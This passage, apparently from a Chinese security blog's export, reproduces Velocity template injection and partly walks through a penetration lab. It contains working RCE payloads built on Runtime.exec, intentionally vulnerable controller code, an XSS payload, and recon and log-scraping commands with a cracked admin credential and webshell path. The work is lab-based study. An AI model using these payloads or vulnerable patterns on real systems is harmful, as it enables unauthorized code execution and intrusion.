class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>调用静态方法：假设存在一个名为mathUtil的Java类，其中有一个静态方法add(a, b)，则可以通过$mathUtil.add(5, 3)来调用该静态方法并将结果赋值给变量。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">#set($result = $mathUtil.add(5, 3))</span><br><span class=\"line\">Result: $result</span><br></pre></td></tr></table></figure>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><h3 id=\"evaluate触发\"><a href=\"#evaluate触发\" class=\"headerlink\" title=\"evaluate触发\"></a>evaluate触发</h3><p>evaluate方法使用VelocityEngine的evaluate方法来执行Velocity模板的评估。用户输入通过HttpServletRequest对象获取，并放入VelocityContext中进行渲染。</p>\n<p>我们分别创建一个Controller和一个evaluate.vm（WEB-INF&#x2F;views&#x2F;evaluate.vm）模板文件</p>\n<p>VelocityInjectionController.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.Template;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.VelocityContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.runtime.RuntimeConstants;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.StringWriter;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">VelocityInjectionController</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;/evaluate&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> ModelAndView <span class=\"title function_\">evaluate</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 从请求参数中获取模板值</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">template</span> <span class=\"operator\">=</span> request.getParameter(<span class=\"string\">&quot;template&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 动态创建Velocity上下文并设置参数</span></span><br><span class=\"line\">        <span class=\"type\">VelocityContext</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">VelocityContext</span>();</span><br><span class=\"line\">        context.put(<span class=\"string\">&quot;params&quot;</span>, request.getParameterMap());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 创建VelocityEngine实例</span></span><br><span class=\"line\">        <span class=\"type\">VelocityEngine</span> <span class=\"variable\">engine</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">VelocityEngine</span>();</span><br><span class=\"line\">        <span class=\"comment\">// 创建StringWriter对象，用于保存模板合并的结果</span></span><br><span class=\"line\">        <span class=\"type\">StringWriter</span> <span class=\"variable\">sw</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringWriter</span>();</span><br><span class=\"line\">        <span class=\"comment\">// 对模板进行合并，并将结果写入StringWriter对象中</span></span><br><span class=\"line\">        engine.evaluate(context, sw, <span class=\"string\">&quot;TemplateInjectionTest&quot;</span>, template);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 创建ModelAndView对象，指定视图名为&quot;evaluate&quot;</span></span><br><span class=\"line\">        <span class=\"type\">ModelAndView</span> <span class=\"variable\">modelAndView</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ModelAndView</span>(<span class=\"string\">&quot;evaluate&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 将模板合并的结果作为属性添加到ModelAndView对象中</span></span><br><span class=\"line\">        modelAndView.addObject(<span class=\"string\">&quot;evaluate&quot;</span>, sw.toString());</span><br><span class=\"line\">        <span class=\"comment\">// 返回ModelAndView对象</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> modelAndView;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>evaluate.vm</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Welcome&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;Hello, $evaluate&lt;/h1&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>启动之后我们在浏览器进行访问，并且给template进行传参</p>\n<p><img src=\"R6EH2eLX9EkBK8ciXUvBDHqx6WEYF4ccqz9f1i1unmQ.png\" alt=\"image\"></p>\n<p>当我输入如下的payload，即可执行命令弹计算器。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.1.7:8090/evaluate?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</span></span><br><span class=\"line\"></span><br><span class=\"line\">http:<span class=\"comment\">//192.168.1.7:8090/evaluate?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20calculator%22)</span></span><br></pre></td></tr></table></figure>\n<p>payload分析：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">#set($e=&quot;e&quot;)：定义了一个Velocity变量$e，并赋值为字符串&quot;e&quot;。</span><br><span class=\"line\">$e.getClass()：获取变量$e的运行时类。</span><br><span class=\"line\">.forName(&quot;java.lang.Runtime&quot;)：通过反射加载java.lang.Runtime类。</span><br><span class=\"line\">.getMethod(&quot;getRuntime&quot;, null)：使用反射获取Runtime类的getRuntime方法，该方法返回Runtime类的实例。</span><br><span class=\"line\">.invoke(null, null)：使用反射调用getRuntime方法，参数为null，因为该方法不接受任何参数。这将返回Runtime类的实例。</span><br><span class=\"line\">.exec(&quot;open -a calculator&quot;)：使用Runtime类的实例的exec方法执行操作系统命令。在这里，命令是open -a calculator，即打开Mac的计算器</span><br></pre></td></tr></table></figure>\n<p><img src=\"FXDvMw-mZbFKkJWy2WeQxLuvD_MnxY5szaLGd5tY71A.png\" alt=\"image\"></p>\n<p>当执行来到engine.evaluate；我们跟进去，直接就看到了RuntimeInstance.evaluate；最后会调用 render 方法将解析后的内容渲染到 writer 中，并返回渲染结果。</p>\n<p><img src=\"OTTrkwaD48kmWMeLr0eWwk-czU0HNp-cfJI_aC8yzQM.png\" alt=\"image\"></p>\n<p>我们跟进到render；这里主要实现的是将解析后的节点树渲染到指定的写入器中。</p>\n<p>首先在634行调用 nodeTree.init对节点树进行初始化。接着调用 nodeTree.render将节点树渲染到写入器中。</p>\n<p><img src=\"GEzXUDp1CKnts7uiCddd7xC_F3jowMmURa2EGbhSnHs.png\" alt=\"image\"></p>\n<p>我们跟进去到render。这里主要实现的是获取节点树的子节点数量，并使用 for 循环遍历所有子节点。通过 jjtGetChild(i) 方法获取第 i 个子节点，并调用其 render 方法来渲染子节点内容到指定的写入器中。</p>\n<p><img src=\"UGMcgk69DSeynfPc6YWa5jdgi7DD3Ien02rrvHwHIZU.png\" alt=\"image\"></p>\n<p>继续跟进jjtGetChild(i).render；最后来到了ASTReference.render.</p>\n<p>先判断this.referenceType 的值是否为 4；然后判断this.escaped 的值为false</p>\n<p><img src=\"Sz0JaLsEbm3rHrBO7prHwhKmajlCTrr8GtLim-n9zns.png\" alt=\"image\"></p>\n<p>继续跟进来之后，就到了ASTMethod.execute。这里接受一个 Object 对象和一个 InternalContextAdapter 对象作为参数。我们直接看到</p>\n<p>64行调用 method.invoke(o, params) 方法执行方法调用，并将结果存储在 obj 变量中。</p>\n<p><img src=\"cx6U8Dy33SZ83zMkgy0RsbRxvAdG7SE2UCCdSD41DiM.png\" alt=\"image\"></p>\n<p>跟进去查看invoke；判断方法是否为可变参数方法，如果是就进行一系列操作。最后调用doInvoke方法执行实际的方法调用，并返回结果。</p>\n<p>而doInvoke方法，正是下面的doInvoke方法</p>\n<p><img src=\"2rmWK-yuQD5cNSkFKD1bB8tNjQdUs36-LlqVe2N-oCY.png\" alt=\"image\"></p>\n<p>即最后调用的是Java反射里面的invoke，进行执行</p>\n<p><img src=\"gqHxkuWfjGAmXS_7sZ40jgETA1al3QAwPHopOAOXxlk.png\" alt=\"image\"></p>\n<p><img src=\"QGSEIAGjGerH-YO291vvHX5DqtdFE709g359lPuCM8o.png\" alt=\"image\"></p>\n<p>思考了一下，也可能存在XSS，于是反射的XSS尝试</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.51.154:8090/evaluate?template=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"AlCh1405RmIsFuw0LhyvhXbiWXaQO1KO5oxHnNzjjYE.png\" alt=\"image\"></p>\n<h3 id=\"merge触发\"><a href=\"#merge触发\" class=\"headerlink\" title=\"merge触发\"></a>merge触发</h3><p>merge方法使用VelocityEngine的getTemplate方法获取指定的模板文件，然后使用merge方法将模板和上下文数据合并为最终结果。</p>\n<p>创建一个servlet</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.Template;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.VelocityContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.runtime.RuntimeConstants;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.StringWriter;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">VelocityInjectionController</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@RequestMapping(&quot;/merge&quot;)</span></span><br><span class=\"line\">   <span class=\"keyword\">public</span> ModelAndView <span class=\"title function_\">merge</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 从请求参数中获取模板值</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">template</span> <span class=\"operator\">=</span> request.getParameter(<span class=\"string\">&quot;template&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 从classpath中加载Velocity模板</span></span><br><span class=\"line\">        <span class=\"type\">VelocityEngine</span> <span class=\"variable\">engine</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">VelocityEngine</span>();</span><br><span class=\"line\">        engine.setProperty(RuntimeConstants.RESOURCE_LOADER, <span class=\"string\">&quot;classpath&quot;</span>);</span><br><span class=\"line\">        engine.setProperty(<span class=\"string\">&quot;classpath.resource.loader.class&quot;</span>, ClasspathResourceLoader.class.getName());</span><br><span class=\"line\">        engine.init();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 动态创建Velocity上下文并设置参数</span></span><br><span class=\"line\">        <span class=\"type\">VelocityContext</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">VelocityContext</span>();</span><br><span class=\"line\">        context.put(<span class=\"string\">&quot;params&quot;</span>, request.getParameterMap());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 进行模板合并</span></span><br><span class=\"line\">        <span class=\"type\">Template</span> <span class=\"variable\">tpl</span> <span class=\"operator\">=</span> engine.getTemplate(template);</span><br><span class=\"line\">        <span class=\"type\">StringWriter</span> <span class=\"variable\">sw</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringWriter</span>();</span><br><span class=\"line\">        tpl.merge(context, sw);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 创建ModelAndView对象，指定视图名为&quot;hello&quot;</span></span><br><span class=\"line\">        <span class=\"type\">ModelAndView</span> <span class=\"variable\">modelAndView</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ModelAndView</span>(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 将模板合并的结果作为属性添加到ModelAndView对象中</span></span><br><span class=\"line\">        modelAndView.addObject(<span class=\"string\">&quot;hello&quot;</span>, sw.toString());</span><br><span class=\"line\">        <span class=\"comment\">// 返回ModelAndView对象</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> modelAndView;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"6gHMHG98hAQ6hRAKpP-0COCLICmlK0FcRITxbFCFle0.png\" alt=\"image\"></p>\n<p>当我们能上传或者更改vm的时候，我们插入一下的内容到vm模板中</p>\n<p>再在resources&#x2F;templates中新建一个模板：merge.vm</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#set($e=<span class=\"string\">&quot;e&quot;</span>);$e.getClass().forName(<span class=\"string\">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"literal\">null</span>).invoke(<span class=\"literal\">null</span>,<span class=\"literal\">null</span>).exec(<span class=\"string\">&quot;open -a calculator&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p><img src=\"mcr9pym-U7v_SjkGkg7YrfFDL9fE_h8Di3CobRzLmD4.png\" alt=\"image\"></p>\n<p>启动项目之后进行访问即可执行模板里面的代码，当然这个${name}是我hello模板里面的内容。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.51.154:8090/merge?template=/templates/merge.vm</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"lxJHRmZLBd0hlYOZ5e9qgw_VRUUHll3bCjkxUlVpV2s.png\" alt=\"image\"></p>\n<h2 id=\"有回显示的payload\"><a href=\"#有回显示的payload\" class=\"headerlink\" title=\"有回显示的payload\"></a>有回显示的payload</h2><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">#set($x=&#x27;&#x27;)+#set($rt=$x.class.forName(&#x27;java.lang.Runtime&#x27;))+#set($chr=$x.class.forName(&#x27;java.lang.Character&#x27;))+#set($str=$x.class.forName(&#x27;java.lang.String&#x27;))+#set($ex=$rt.getRuntime().exec(&#x27;id&#x27;))+$ex.waitFor()+#set($out=$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>\n<p>payload解释</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">rt = java.lang.Runtime.class</span><br><span class=\"line\">chr = java.lang.String</span><br><span class=\"line\">ex = java.lang.Runtime.getRuntime().exec(&quot;id&quot;)</span><br><span class=\"line\">ex.waitFor()</span><br><span class=\"line\">// 循环读取输出</span><br></pre></td></tr></table></figure>\n<p>在win上测试ipconfig成功</p>\n<p><img src=\"PYVKv7Unio_BKPIkrsOT9Jyztnwo_5vcvASGjUjbbIU.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>因为Spring框架版本的问题，高版本不能直接整合Velocity模板，一直报错踩坑</li>\n<li>Velocity模板目前也逐渐被其它模板引擎替代，如：Thymeleaf</li>\n</ul>\n<p><a href=\"SLmechCA4omG-VyIgYft1yVaqMiGgGSm2uUYQEIwXb8.zip\">office</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","模板注入"]},{"title":"打靶日记（三）完整的内网域渗透","url":"/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/","content":"<h1 id=\"打靶日记（三）完整的内网域渗透\"><a href=\"#打靶日记（三）完整的内网域渗透\" class=\"headerlink\" title=\"打靶日记（三）完整的内网域渗透\"></a>打靶日记（三）完整的内网域渗透</h1><p><strong>声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第三篇。</strong></p>\n<h1 id=\"1-环境介绍\"><a href=\"#1-环境介绍\" class=\"headerlink\" title=\"1.环境介绍\"></a>1.环境介绍</h1><p>这个靶场是 webhack123 WEB 服务器有两块网卡 dc 是域控 本文为技术培训技术文档，过程可能会让新人有点难以理解。 过程是从 kali 渗透到 web 再渗透到内网 dc 也就是从外网打到域控</p>\n<h2 id=\"1-1环境图\"><a href=\"#1-1环境图\" class=\"headerlink\" title=\"1.1环境图\"></a>1.1环境图</h2><p><img src=\"NFWgEW1x5hckIW3rsJbmIdedkVrToiaVZpKA9fD4xXU.png\" alt=\"image\"></p>\n<p> </p>\n<h1 id=\"2-信息收集\"><a href=\"#2-信息收集\" class=\"headerlink\" title=\"2.信息收集\"></a>2.信息收集</h1><p>1. 主机发现，netdiscover</p>\n<p><img src=\"gB25X1osV3BNaP-U4k9m-q22zi0F0RNOVidAvB4vAjc.png\" alt=\"image\"></p>\n<h2 id=\"2-1masscan-端口探测\"><a href=\"#2-1masscan-端口探测\" class=\"headerlink\" title=\"2.1masscan 端口探测\"></a>2.1masscan 端口探测</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">masscan -p 1-65535 192.168.8.83 --rate=1000</span><br></pre></td></tr></table></figure>\n<p><img src=\"0MqARHecC40A7Gnm5VYnDQCNVPJJ2pR13GBz9uFjGK8.png\" alt=\"image\"></p>\n<h2 id=\"2-3nmap-获取系统和端口版本信息\"><a href=\"#2-3nmap-获取系统和端口版本信息\" class=\"headerlink\" title=\"2.3nmap 获取系统和端口版本信息\"></a>2.3nmap 获取系统和端口版本信息</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nmap -p 49157,47001,3306,49155,135,445,49153,3389,80,49154,49152,49156,139 -A 192.168.8.83 -oA webhack</span><br></pre></td></tr></table></figure>\n<p><img src=\"5YYNRJGijff8qzSjgtnErTQ2wz1LRQmr5KNmPSGfij0.png\" alt=\"image\"></p>\n<p>从端口探测的信息得到服务器是 WEB 容器是 phpstudy 套件操作系统是 Microsoft Windows Server 2008 R2</p>\n<p> </p>\n<h1 id=\"3-对网站进行安全检测\"><a href=\"#3-对网站进行安全检测\" class=\"headerlink\" title=\"3.对网站进行安全检测\"></a>3.对网站进行安全检测</h1><h2 id=\"3-1-绑定-hosts\"><a href=\"#3-1-绑定-hosts\" class=\"headerlink\" title=\"3.1.绑定 hosts\"></a>3.1.绑定 hosts</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.8.83 www.webhack123.com</span><br></pre></td></tr></table></figure>\n<p>发 <a href=\"http://www.webhack123.com/\">www.webhack123.com</a> 是一个 xxx 平台 核心框架是 ThinkPHP_3.1.3</p>\n<p>后台暂时还不知道</p>\n<p><img src=\"s8kS7FkYjnGU6-5sziyxRpxG6PCNWNwrLkLBljK1rDc.png\" alt=\"image\"></p>\n<h2 id=\"3-2gobuster-目录文件扫描\"><a href=\"#3-2gobuster-目录文件扫描\" class=\"headerlink\" title=\"3.2gobuster 目录文件扫描\"></a>3.2gobuster 目录文件扫描</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gobuster <span class=\"built_in\">dir</span> -u http://www.webhack123.com -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"GwpIqmowBBwnv6tZGsxSgXzJSmcSSEK2KZz1kZsu-ec.png\" alt=\"image\"></p>\n<h2 id=\"3-3-svn-遍历源代码漏洞\"><a href=\"#3-3-svn-遍历源代码漏洞\" class=\"headerlink\" title=\"3.3 .svn 遍历源代码漏洞\"></a>3.3 .svn 遍历源代码漏洞</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.webhack123.com/.svn/entries</span><br></pre></td></tr></table></figure>\n<p><img src=\"OzWYWQ1hyex-rFTZm84rWcUI4wwELEX86SL3lflflQQ.png\" alt=\"image\"></p>\n<h2 id=\"3-4wc-db-文件下载\"><a href=\"#3-4wc-db-文件下载\" class=\"headerlink\" title=\"3.4wc.db 文件下载\"></a>3.4wc.db 文件下载</h2><p>在svn中是有一个数据库文件的，如果存在的话，我们可以下载打开。</p>\n<p>这个sqlite数据库文件 里面存在网站目录文件信息</p>\n<p>svn如果没有获取 可以下载当前下的wc.db用 sqlitebrowser wc.db打开</p>\n<p>下载 <a href=\"http://www.webhack123.com/.svn/wc.db\">http://www.webhack123.com/.svn/wc.db</a></p>\n<p><img src=\"_R-gjEN5EtgKtmftcJL0qMMcJ-XzxaqrluUcjl4nG0w.png\" alt=\"image\"></p>\n<p><img src=\"My6-i-dheMWizV6HnJUWQQIkcV3IXdaQ5UmjVcawlhc.png\" alt=\"image\"></p>\n<p><img src=\"093yGZHMwDL4iLP9DMYDrIg8DdLep2y1wU0CqdKmd0k.png\" alt=\"image\"></p>\n<p>查看数据库 基本知道网站的整个架构</p>\n<p> </p>\n<h2 id=\"3-5thinkphp-日志文件泄露\"><a href=\"#3-5thinkphp-日志文件泄露\" class=\"headerlink\" title=\"3.5thinkphp 日志文件泄露\"></a>3.5thinkphp 日志文件泄露</h2><p>在ThinkPHP_3.1.3中 日志文件始开启的经过wc.db可以知道文件目录位置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.webhack123.com/App/Runtime/Logs/19_06_29.<span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"Au1l3sZUJ1mtejlCLiUm-dRcugBW-aviFqrd3BRi234.png\" alt=\"image\"></p>\n<h2 id=\"3-6python-编写日志文件\"><a href=\"#3-6python-编写日志文件\" class=\"headerlink\" title=\"3.6python 编写日志文件\"></a>3.6python 编写日志文件</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/python</span></span><br><span class=\"line\">import requests</span><br><span class=\"line\">url =<span class=\"string\">&quot;http://www.webhack123.com/App/Runtime/Logs&quot;</span></span><br><span class=\"line\">def add_urls(patch,y): </span><br><span class=\"line\">    urls=[]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(1,7):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(1,32): </span><br><span class=\"line\">         <span class=\"keyword\">if</span> i&lt;10:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> j&lt;10: </span><br><span class=\"line\">             urls.append(patch+<span class=\"string\">&quot;/%s_0%s_0%s.log&quot;</span> % (y,i,j)) </span><br><span class=\"line\">            <span class=\"keyword\">else</span>: </span><br><span class=\"line\">             urls.append(patch+<span class=\"string\">&quot;/%s_0%s_%s.log&quot;</span> % (y,i,j)) </span><br><span class=\"line\">         <span class=\"keyword\">else</span>:</span><br><span class=\"line\">          <span class=\"keyword\">if</span> j&lt;10: </span><br><span class=\"line\">           urls.append(patch+<span class=\"string\">&quot;/%s_%s_0%s.log&quot;</span> % (y,i,j)) </span><br><span class=\"line\">          <span class=\"keyword\">else</span>: </span><br><span class=\"line\">           urls.append(patch+<span class=\"string\">&quot;/%s_%s_%s.log&quot;</span> % (y,i,j))  </span><br><span class=\"line\">    <span class=\"built_in\">return</span> urls</span><br><span class=\"line\">urls = add_urls(url,<span class=\"string\">&quot;20&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> urls:</span><br><span class=\"line\">    req=requests.get(i) </span><br><span class=\"line\">    <span class=\"keyword\">if</span> req.status_code==200: </span><br><span class=\"line\">     <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">     html = req.text </span><br><span class=\"line\">     with open(<span class=\"string\">&quot;webhack123.txt&quot;</span>,<span class=\"string\">&#x27;a&#x27;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) as f:</span><br><span class=\"line\">          f.write(html)</span><br></pre></td></tr></table></figure>\n<p><img src=\"U8_UoD_IQhKd3x31q7OvtE8uQ7u0s7dJ_T6WCrNCZKQ.png\" alt=\"image\"></p>\n<h2 id=\"3-7发现管理密文\"><a href=\"#3-7发现管理密文\" class=\"headerlink\" title=\"3.7发现管理密文\"></a>3.7发现管理密文</h2><p>thinkphp 低版本在会记录修改密码的日志</p>\n<p><img src=\"Zx5UsapoyWxfVB0u0SWCGYTHTo0ONAPdyD4qlWlXmSI.png\" alt=\"image\"></p>\n<p>账号 admin 密文 74c774ef39b5b977c1fd59dbfc73c3e380a65aa3</p>\n<p><img src=\"JC2c2X4seT4wUBxKOv6d33WraIRAKNe9j_1AB6_03No.png\" alt=\"image\"></p>\n<p>通过 somd5 解 web123</p>\n<p> </p>\n<h2 id=\"3-8绑定-hosts-碰撞管理后台子域名\"><a href=\"#3-8绑定-hosts-碰撞管理后台子域名\" class=\"headerlink\" title=\"3.8绑定 hosts 碰撞管理后台子域名\"></a>3.8绑定 hosts 碰撞管理后台子域名</h2><p>如果扫描目录后台 还是找不到后台可以试试绑定 hosts 碰撞子域名这种方法</p>\n<p>最近有老哥写了一个脚本在 <a href=\"https://github.com/fofapro/Hosts/_scan\">https://github.com/fofapro/Hosts\\_scan</a> 脚本与我的需求有点</p>\n<p>不合适小修改了一下自动导入 top3K 子域名进行穷举碰撞 IP 修改后的脚本</p>\n<p>直接运行脚本</p>\n<p><img src=\"Kr1D5vbvsOl50oAYwWMdfDyxXDrhDnKs4c3Sk4yG7Kg.png\" alt=\"image\"></p>\n<p>admin.webhack123.com 这个就是它的后台地址</p>\n<p>hosts需要绑定，不然打开失败</p>\n<p><img src=\"48MrxQade2LnE7f2-6DgYgehZ4fj3vUf_cwNJrwATs4.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.8.83         admin.webhack123.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"ah8rEg0-D617vUOk3sAHpPzYWfNPCSsJpmgNiHNQkR0.png\" alt=\"image\"></p>\n<h2 id=\"3-9后台验证码逻辑漏洞\"><a href=\"#3-9后台验证码逻辑漏洞\" class=\"headerlink\" title=\"3.9后台验证码逻辑漏洞\"></a>3.9后台验证码逻辑漏洞</h2><p>可以穷举密码</p>\n<p><img src=\"HxoSSBiW0drpMNdCPSztIjd_QpwgQU4_XZ1OArVmQFk.png\" alt=\"image\"></p>\n<p><img src=\"tZ1brzYJRVgL43PWYQ5F4k_IzX0wuBBDzBQ5vNmMZn8.png\" alt=\"image\"></p>\n<h2 id=\"3-10-设置上传文件类型拿-webshell\"><a href=\"#3-10-设置上传文件类型拿-webshell\" class=\"headerlink\" title=\"3.10. 设置上传文件类型拿 webshell\"></a>3.10. 设置上传文件类型拿 webshell</h2><p><img src=\"F8ZvsBbhzEdcQ0XE-8xhk2N2_-U_dH-IAD7tx5uscVY.png\" alt=\"image\"></p>\n<p><img src=\"Bffgpehsr35gvY_x5NPTjuCGpk13CmYY2syssuhDUyc.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.webhack123.com/Public/Upload/20211103/7d2e82062e4668139f1b27c7d94dab29.php</span><br></pre></td></tr></table></figure>\n<p><img 